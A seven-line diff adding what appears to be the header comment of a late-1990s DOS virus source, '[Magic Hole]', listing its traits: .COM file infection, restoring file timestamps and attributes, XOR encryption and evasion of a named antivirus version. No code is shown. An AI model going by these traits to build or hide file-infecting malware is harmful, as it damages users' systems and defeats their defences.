@@ -1,0 +1,7 @@
+   [Magic Hole] Virus
+   Copyright (C) 1998-99 by Deadman (dman@mail.ru)
+   Simple (Very) Classic non-resident .COM infector
+   Restore file time/date/attributes
+   Doesn't infect files on floppy disks
+   No DrWeb 4.03 detection (- Ok)
+   Encrypted (via XOR)
